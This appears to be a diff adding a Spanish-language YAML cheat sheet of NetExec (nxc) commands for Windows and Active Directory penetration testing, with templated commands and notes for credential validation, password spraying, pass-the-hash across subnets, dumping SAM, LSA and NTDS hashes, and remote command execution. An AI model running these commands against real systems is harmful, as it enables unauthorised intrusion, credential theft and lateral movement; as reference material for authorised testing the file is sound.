@@ -1,0 +1,92 @@
+# Comandos de NetExec (nxc), sucesor de CrackMapExec (cme): la navaja suiza de redes Windows/AD.
+tool: nxc
+area: ad
+url: https://www.netexec.wiki/
+commands:
+  - id: nxc-smb-enum
+    title: Validar una credencial y sacar info del host
+    cmd: |
+      nxc smb {{RHOST}} -u {{USER}} -p '{{PASS}}'
+    phase: enum
+    tags: [smb, enumeration]
+    notes: >-
+      Donde pongas cme, nxc hace lo mismo (CrackMapExec está descontinuado). Un [+] verde valida la
+      credencial; un (Pwn3d!) al lado significa admin local en ese host: puedes ejecutar y volcar hashes.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-spray
+    title: Password spraying por SMB
+    cmd: |
+      nxc smb {{DC_IP}} -u users.txt -p '{{PASS}}' --continue-on-success
+    phase: credential-access
+    tags: [smb, spraying]
+    notes: >-
+      Una contraseña contra muchos usuarios. Mira el lockout antes (--pass-pol): spraying (1 pass ×
+      N users) es seguro, fuerza bruta (N pass × 1 user) bloquea. --continue-on-success no para al
+      primer acierto. STATUS_ACCOUNT_LOCKED_OUT = para ya.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-pth
+    title: Pass-the-Hash en una subred
+    cmd: |
+      nxc smb {{SUBNET}} -u Administrator -H {{HASH}} --local-auth
+    phase: lateral
+    tags: [smb, pass-the-hash]
+    notes: >-
+      Autentica con el hash NT sin saber la contraseña. --local-auth lo prueba contra la cuenta
+      local de cada host (para el admin local reutilizado); sin él, autentica contra el dominio.
+      Barre toda la subred y marca con (Pwn3d!) dónde es admin.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-shares
+    title: Shares y permisos con credenciales
+    cmd: |
+      nxc smb {{RHOST}} -u {{USER}} -p '{{PASS}}' --shares
+    phase: enum
+    tags: [smb, shares]
+    notes: La misma foto de permisos que smbmap, pero a escala de muchos hosts de un solo comando.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-users
+    title: Usuarios y política de contraseñas del dominio
+    cmd: |
+      nxc smb {{DC_IP}} -u {{USER}} -p '{{PASS}}' --users --pass-pol
+    phase: enum
+    tags: [smb, enumeration]
+    notes: >-
+      --users lista las cuentas del dominio (base para el spraying) y --pass-pol la política de
+      contraseñas y el umbral de bloqueo, que hay que leer antes de lanzar nada por fuerza.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-sam
+    title: Volcar la SAM local
+    cmd: |
+      nxc smb {{RHOST}} -u Administrator -H {{HASH}} --local-auth --sam
+    phase: credential-access
+    tags: [smb, credential-dumping, ntlm]
+    notes: >-
+      Vuelca los hashes NTLM de las cuentas locales del host (necesita admin local, de ahí el
+      (Pwn3d!)). --lsa saca secretos LSA y credenciales cacheadas; --ntds, la base del dominio desde un DC.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-smb-exec
+    title: Ejecutar un comando por SMB
+    cmd: |
+      nxc smb {{RHOST}} -u Administrator -H {{HASH}} -x 'whoami'
+    phase: lateral
+    tags: [smb, pass-the-hash]
+    notes: >-
+      -x ejecuta por cmd, -X por PowerShell. Necesita admin local en el host (Pwn3d!). Es ruidoso:
+      deja eventos 4624/4672 en los logs.
+    refs: [https://www.netexec.wiki/]
+
+  - id: nxc-winrm
+    title: Validar acceso por WinRM
+    cmd: |
+      nxc winrm {{RHOST}} -u {{USER}} -p '{{PASS}}'
+    phase: lateral
+    tags: [winrm]
+    notes: >-
+      Si responde (Pwn3d!), esa cuenta abre una shell interactiva: salta a evil-winrm con las mismas
+      credenciales o hash. También acepta -H para Pass-the-Hash por WinRM.
+    refs: [https://www.netexec.wiki/]
